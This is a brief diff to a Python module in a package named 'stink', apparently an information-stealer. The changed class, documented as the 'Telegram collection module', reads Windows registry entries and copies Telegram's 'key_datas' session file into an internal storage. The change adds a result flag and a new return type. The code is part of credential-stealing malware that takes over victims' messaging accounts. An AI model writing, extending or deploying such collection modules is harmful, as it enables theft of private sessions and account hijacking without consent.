@@ -1,10 +1,11 @@
 from re import findall
 from os import listdir, path
-from typing import Optional, List
+from typing import Optional
 from winreg import OpenKey, QueryValueEx, QueryInfoKey, EnumKey, HKEY_CURRENT_USER
 
 from stink.helpers import MemoryStorage
 from stink.helpers.config import TelegramConfig
+from stink.helpers.dataclasses import Data
 
 
 class Telegram:
@@ -95,7 +96,9 @@ class Telegram:
             path.join(self.__folder, "key_datas")
         )
 
-    def run(self) -> List:
+        self.__storage.add_data("Telegram", True)
+
+    def run(self) -> Data:
         """
         Launches the Telegram collection module.
 
